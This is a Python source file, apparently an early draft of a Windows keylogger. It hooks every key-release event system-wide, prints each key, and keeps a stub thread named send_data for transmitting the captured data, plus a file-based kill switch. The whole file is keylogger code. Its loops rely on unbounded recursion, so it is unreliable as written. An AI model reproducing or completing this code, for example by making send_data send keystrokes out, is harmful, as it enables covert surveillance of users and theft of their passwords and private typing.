from threading import Thread, Lock, Condition
import sys
from win32api import LoadKeyboardLayout
import keyboard
import time


class App():
    def __init__(self):
        self.kill_send_info = False
        self.kill_keyboard = False

        self.th1 = Thread(target=self.start_keylogger)
        self.th2 = Thread(target=self.send_data)


    def send_data(self):
        if self.kill_send_info == True:
            print('Sending data was stopped')
            sys.exit()
        else:
            print('sending data first')
            time.sleep(3)
            self.send_data()



    def get_keyboard_pressed(self, e):
        if e.event_type == 'up':
            print(f'You pressed: {e.name}')


    def start_keylogger(self):
        if self.kill_keyboard == False:
            keyboard.hook(self.get_keyboard_pressed)
            # keyboard.wait()
        else:
            print('EXITING')
            sys.exit()


    def check_params(self):
        with open('test.txt', 'r') as file:
            result = file.read()
            if result == 'stop':
                self.kill_keyboard = True
                self.kill_send_info = True
                sys.exit()
            else:
                print('Flags are working.')
                time.sleep(1.5)
                self.check_params()



    def run(self):
        self.th1.start()
        self.th2.start()
        self.check_params()


if __name__ == '__main__':
    LoadKeyboardLayout('00000409', 1)
    App().run()



# with open("test.txt", "r") as f:
        #     text = f.read()
        #     if text == '1':
        #         print(f'like: {text}')
        #         time.sleep(1)
        #         self.smel()
        #     else:
        #         sys.exit()